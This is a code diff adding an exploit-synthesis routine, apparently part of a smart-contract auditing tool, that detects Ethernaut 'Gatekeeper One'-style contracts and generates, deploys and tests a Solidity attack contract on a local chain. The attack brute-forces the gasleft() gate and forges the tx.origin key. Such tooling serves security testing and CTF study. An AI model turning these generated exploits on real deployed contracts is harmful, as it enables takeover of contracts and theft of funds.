@@ -2605,6 +2605,91 @@ def _synth_magicnumber(name, target_src, invariants_src, manifest, scan_step, t0
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_gatekeeper_one(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Gatekeeper One 류: gasleft()%N==0 게이트를 컨트랙트 내 루프로 브루트포스하고
+    (msg.sender!=tx.origin 는 컨트랙트 호출로, 키 플로우는 tx.origin 마스크로) 통과해 entrant 탈취."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    gm = re.search(r"gasleft\s*\(\s*\)\s*%\s*(\d+)", tb)
+    if not gm or not re.search(r"uint16\s*\(\s*uint160\s*\(\s*tx\.origin", tb):
+        return None
+    N = int(gm.group(1))
+    ent = None; setter = None
+    for fn in _functions(tb):
+        if any(a[0].startswith("bytes8") for a in fn["args"]) and fn["external"]:
+            setter = fn["name"]
+            mm = re.search(r"(\w+)\s*=\s*tx\.origin", fn["body"])
+            if mm: ent = mm.group(1)
+            break
+    if not setter:
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    pwn_src = (HEADER +
+        f"interface IT {{ function {setter}(bytes8) external returns (bool); }}\n"
+        "contract Pwn {\n"
+        "    function attack(address t) external returns (bool) {\n"
+        "        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);\n"
+        f"        for (uint256 i = 0; i < {N}; i++) {{\n"
+        f"            (bool ok, ) = t.call{{gas: {N*7} + i}}(abi.encodeWithSelector(IT.{setter}.selector, key));\n"
+        "            if (ok) return true;\n"
+        "        }\n"
+        "        revert(\"no gas match\");\n"
+        "    }\n}\n")
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts or "Pwn" not in arts:
+        return None
+    abi = arts[name]["abi"]
+    w3, acct = _mk_evm()
+    def deploy(cn, args):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":acct,"gas":6_000_000})).contractAddress
+    try:
+        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
+        paddr = deploy("Pwn", [])
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    e0 = tc.functions[ent]().call() if (ent and _has_getter(abi, ent)) else None
+    pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
+    try:
+        pwn.functions.attack(Web3.to_checksum_address(taddr)).transact({"from":acct,"gas":28_000_000})
+    except Exception:
+        return None
+    e1 = tc.functions[ent]().call() if (ent and _has_getter(abi, ent)) else None
+    if ent and e1 is not None and e1 == e0:
+        return None
+    poc = (HEADER +
+        "// Strategy: Gatekeeper One. Call from a contract (gateOne), brute-force the\n"
+        f"// gasleft()%{N}==0 gate in a loop, key = uint64(tx.origin) & 0xFFFFFFFF0000FFFF.\n"
+        f"interface IT {{ function {setter}(bytes8) external returns (bool); }}\n"
+        "contract Exploit {\n"
+        "    function run(address t) external {\n"
+        "        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);\n"
+        f"        for (uint256 i = 0; i < {N}; i++) {{\n"
+        f"            (bool ok, ) = t.call{{gas: {N*7} + i}}(abi.encodeWithSelector(IT.{setter}.selector, key));\n"
+        "            if (ok) return;\n"
+        "        }\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (gatekeeper-one)","strategy":"gatekeeper-one","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"{ent or 'entrant'} set via gas brute-force + key",
+            "strategy":f"gatekeeper-one:{setter}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":f"gasleft()%{N}==0 게이트를 루프로 브루트포스하고 tx.origin 마스크 키로 통과해 entrant 를 탈취했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_gas_griefing(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Denial 류: 설정 가능한 수신자에게 가스 한도 없이 .call 로 송금한 뒤
     같은 함수에서 추가 상태전이가 이어지는 구조. 공격자가 수신자로 등록되어 콜백에서
@@ -3313,6 +3398,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0n2) Gatekeeper One (gasleft 브루트포스 + tx.origin 키)
+    try:
+        r = _synth_gatekeeper_one(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 0o) Magic Number (10바이트 런타임 solver)
     try:
         r = _synth_magicnumber(name, target_src, invariants_src, manifest, scan_step, t0)
@@ -3385,7 +3477,7 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
     for fn in (_storage_attempt, _proxy_attempt, _multiblock_attempt,
                _synth_storage_collision, _synth_king_dos, _synth_callback_inconsistency,
                _synth_shop, _synth_lockup_bypass, _synth_gas_griefing, _synth_force,
-               _synth_gatekeeper_two, _synth_magicnumber):
+               _synth_gatekeeper_two, _synth_gatekeeper_one, _synth_magicnumber):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
